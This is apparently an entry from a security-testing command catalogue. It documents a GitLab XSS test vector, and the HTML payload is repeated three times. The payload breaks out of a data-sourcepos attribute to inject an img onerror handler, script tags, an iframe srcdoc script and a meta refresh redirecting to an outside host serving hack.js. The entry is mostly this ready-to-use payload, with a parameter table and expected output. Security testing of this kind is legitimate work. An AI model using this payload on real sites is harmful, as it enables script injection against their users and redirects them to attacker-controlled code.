---
data: >-
  <pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><img src=#
  onerror=alert(1)><script>alert(2)</script><iframe
  srcdoc='<script>alert(3)</script>'/><meta http-equiv=refresh
  content='5;https://joaxcar.com/hack.js'><pre x=&#34;"><code></code></pre>
tags:
  - xss
  - testing
type: command
executor: html
platforms:
  - Web
id: ff8bb28b-2e1d-4acf-a2ad-b1e177b42b67
created_at: '2025-12-11T03:47:49.990Z'
updated_at: '2025-12-11T03:47:49.990Z'
verified: false
validated: true
submitted: true
---
# gitlab-xss-test-vectors

## Command

```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><img src=# onerror=alert(1)><script>alert(2)</script><iframe srcdoc='<script>alert(3)</script>'/><meta http-equiv=refresh content='5;https://joaxcar.com/hack.js'><pre x=&#34;"><code></code></pre>
```

## Description

Tests multiple XSS vectors including img onerror, script, iframe, and meta redirect in GitLab.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `srcdoc` | Embeds script in iframe | Yes |
| `content` | Redirects after 5 seconds | Yes |
| `onerror` | Executes alert on error | Yes |

## Examples

### Basic Usage

```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><img src=# onerror=alert(1)><script>alert(2)</script><iframe srcdoc='<script>alert(3)</script>'/><meta http-equiv=refresh content='5;https://joaxcar.com/hack.js'><pre x=&#34;"><code></code></pre>
```

## Expected Output

Multiple alerts and redirect.

## Related

- [[procedures/Trigger-and-Verify-XSS-Execution]]
- [[procedures/Inject-XSS-Payload-into-GitLab-Issue]]
